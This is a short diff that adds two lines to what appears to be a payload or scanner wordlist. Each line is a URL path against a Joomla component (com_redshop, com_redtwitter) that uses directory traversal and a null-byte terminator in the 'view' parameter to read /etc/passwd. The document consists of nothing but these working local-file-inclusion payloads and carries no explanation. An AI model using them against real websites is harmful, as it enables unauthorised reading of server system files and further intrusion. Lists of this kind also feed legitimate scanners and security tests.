@@ -1,0 +1,2 @@
+/index.php?option=com_redshop&view=../../../../../../../../../../../../../../../etc/passwd%00
+/index.php?option=com_redtwitter&view=../../../../../../../../../../../../../../../etc/passwd%00
